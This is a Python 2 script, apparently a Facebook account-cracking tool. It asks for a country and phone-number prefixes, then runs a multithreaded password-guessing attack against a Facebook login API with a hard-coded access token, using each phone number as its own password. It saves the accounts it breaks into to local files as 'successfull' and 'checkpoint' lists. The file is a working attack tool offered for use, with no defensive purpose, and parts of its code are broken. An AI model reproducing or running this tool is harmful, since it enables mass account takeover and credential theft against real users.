				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)
				                                                                                                   def Babarali():
	os.system('clear')
	print logo2
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[1]  Bangladesh\033[1;91m☆.\x1b[1;92m[14]  Australia'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[2]  USA       \033[1;91m☆.\x1b[1;92m[15]  Canda'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[3]  UK        \033[1;91m☆.\x1b[1;92m[16]  China'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[4]  India     \033[1;91m☆.\x1b[1;92m[17]  Denmark'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[5]  Brazil    \033[1;91m☆.\x1b[1;92m[18]  France'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[6]  Japan     \033[1;91m☆.\x1b[1;92m[19]  Germany'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[7]  Korea     \033[1;91m☆.\x1b[1;92m[20]  Malaysia'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[8]  Italy     \033[1;91m☆.\x1b[1;92m[21]  Sri lanka'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[9]  Spain     \033[1;91m☆.\x1b[1;92m[22]  Turkey'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[10] Poland    \033[1;91m☆.\x1b[1;92m[23]  U.A.E'
        time.sleep(0.05)
        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[11] Pakistan  \033[1;91m☆.\x1b[1;92m[24]  Saudi Arabia'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[12] Indonasia \033[1;91m☆.\x1b[1;92m[25]  Israil'
        time.sleep(0.05)
        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[13] Grecee    \033[1;91m☆.\x1b[1;92m[26]  Iran'
        time.sleep(0.05)
	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;91m[0]  Back            '
        time.sleep(0.05)
	print 45*'-'
	action()


def action():
	lovehackerx = raw_input('\n\033[1;91mChoose an Option>>> \033[1;95m')
	if lovehackerx =='':
		print '[!] Fill in correctly'
		action()
	elif lovehackerx =="1":
                print (logo53)
		os.system("clear")
		print (logo27)
		print("\033[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="2":
                print (logo53)
		os.system("clear")
		print (logo28)
		print("\033[1;93m555,786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="3":
                print (logo53)
		os.system("clear")
		print (logo29)
		print("\033[1;93m715,785,765,725,745,735,737, 706, 748, 783, 739, 759, 790")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+44"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="4":
                print (logo53)
		os.system("clear")
		print (logo30)
		print("\033[1;93m905,975,755,855,954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+91"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="5":
                print (logo53)
		os.system("clear")
		print (logo31)
		print("\033[1;93m127, 179, 117, 853, 318, 219, 834, 186, 479, 113")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+55"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="6":
                print (logo53)
		os.system("clear")
		print (logo32)
		print("\033[1;93m11, 12, 19, 16, 15, 13, 14, 18, 17")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+81"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="7":
                print (logo53)
		os.system("clear")
		print (logo33)
		print("\033[1;93m1, 2, 3, 4, 5, 6, 7, 8, 9")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+82"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="8":
                print (logo53)
		os.system("clear")
		print (logo34)
		print("\033[1;93m311,323,385,388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+39"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="9":
                print (logo53)
		os.system("clear")
		print (logo35)
		print("\033[1;93m655,755,60, 76, 73, 64, 69, 77, 65, 61, 75, 68")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+34"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="10":
                print (logo53)
		os.system("clear")
		print (logo36)
		print("\033[1;93m66, 69, 78, 79, 60, 72, 67, 53, 51")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+48"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="11":
                print (logo53)
		os.system("clear")
		print (logo37)
		print("\033[1;93m01, ~to~~, 49")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="12":
                print (logo53)
		os.system("clear")
		print (logo38)
		print("\033[1;93m81,83,85,84,89,")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+880"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="13":
                print (logo53)
		os.system("clear")
		print (logo39)
		print("\033[1;93m(leave the first four digits and the last seven digits of any phone number in this country.Write the remaining digits here.69,693,698,694,695")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+3069"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="14":
                print (logo53)
		os.system("clear")
		print (logo40)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.455")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+61"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="15":
                print (logo53)
		os.system("clear")
		print (logo41)
		print("\033[1;93m(leave the first one digits and the last seven digits of any phone number in this country.Write the remaining digits here.555,")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+1"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="16":
                print (logo53)
		os.system("clear")
		print (logo42)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+86"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="17":
                print (logo53)
		os.system("clear")
		print (logo43)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8")
		try:
			c = raw_input(" \033[1;95mchoose code  : ")
			k="+45"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="18":
                print (logo53)
		os.system("clear")
		print (logo44)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+33"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="19":
                print (logo53)
		os.system("clear")
		print (logo45)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+49"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="20":
                print (logo53)
		os.system("clear")
		print (logo46)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+60"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="21":
                print (logo53)
		os.system("clear")
		print (logo47)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+94"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="22":
                print (logo53)
		os.system("clear")
		print (logo48)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+90"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =="23":
                print (logo53)
		os.system("clear")
		print (logo49)
		print("\033[1;93m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+971"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="24":
                print (logo53)
		os.system("clear")
		print (logo50)
		print("\033[1;93m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+966"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="25":
                print (logo53)
		os.system("clear")
		print (logo51)
		print("\033[1;93m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+972"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
        elif lovehackerx =="26":
                print (logo53)
		os.system("clear")
		print (logo52)
		print("\033[1;93m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902")
		try:
			c = raw_input("\033[1;95m choose code  : ")
			k="+98"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			blackmafiax()
	elif lovehackerx =='0':
		login()
	else:
		print '[!] Fill in correctly'
		action()

	xxx = str(len(id))
	jalan ('[✓] Total Numbers: '+xxx)
	time.sleep(0.05)
	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
	time.sleep(0.05)
	jalan ('[!] To Stop Process Press CTRL Then Press z')
	time.sleep(0.05)
	print 44*'-'
	print (logo13)
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
			os.mkdir('save')
		except OSError:
			pass
		try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[live  ok]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass1+'\n'+"\n"
				okb = open('save/successfull.txt', 'a')
				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;95m[Error CP] ' + k + c + user + ' -•◈•- ' + pass1+'\n'
					cps = open('save/checkpoint.txt', 'a')
					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
#				else:
#				    pass2="ComingSoon"
#				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
#				    q = json.load(data)
#				    if 'access_token' in q:
#				        print '\x1b[1;92m[Successful]\x1b[0m ' + k + c + user + ' -•◈•- ' + pass2+'\n'+"\n"
#				        okb = open('save/successfull.txt', 'a')
#				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
#				        okb.close()
#				        oks.append(c+user+pass2)
#				    else:
#				        if 'www.facebook.com' in q['error_msg']:
#					        print '[Checkpoint] ' + k + c + user + ' -•◈•- ' + pass2+'\n'
#					        cps = open('save/checkpoint.txt', 'a')
#					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
#					        cps.close()
#					        cpb.append(c+user+pass2)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 44*'-'
	print '[✓] Process Has Been Completed ....'
	print '[✓] Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
	print('[✓] CP File Has Been Saved : save/checkpoint.txt')
#Dev:Babar_Ali
        print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
	print '\033[1;94m[Process Has Been Completed]'
	print"\033[1;94mTotal\033[1;92mOK/\x1b[1;91mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
	print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
	print """
             

\033[1;96m╔═══╗───────╔╗╔══╗
\033[1;96m║╔═╗║───────║║║╔╗║
\033[1;96m║║─╚╬══╦══╦═╝║║╚╝╚╦╗─╔╦══╗
\033[1;96m║║╔═╣╔╗║╔╗║╔╗║║╔═╗║║─║║║═╣
\033[1;96m║╚╩═║╚╝║╚╝║╚╝║║╚═╝║╚═╝║║═╣
\033[1;96m╚═══╩══╩══╩══╝╚═══╩═╗╔╩══╝
\033[1;96m──────────────────╔═╝║
\033[1;96m──────────────────╚══╝
"""
	print "\033[1;95m«-----------------\033[1;91mKalilinux\033[1;95m-----------------»"
	raw_input("\n\033[1;97m[\033[1;95mBack\033[1;97m]")
	menu()

if __name__ == '__main__':
	login()
gin()
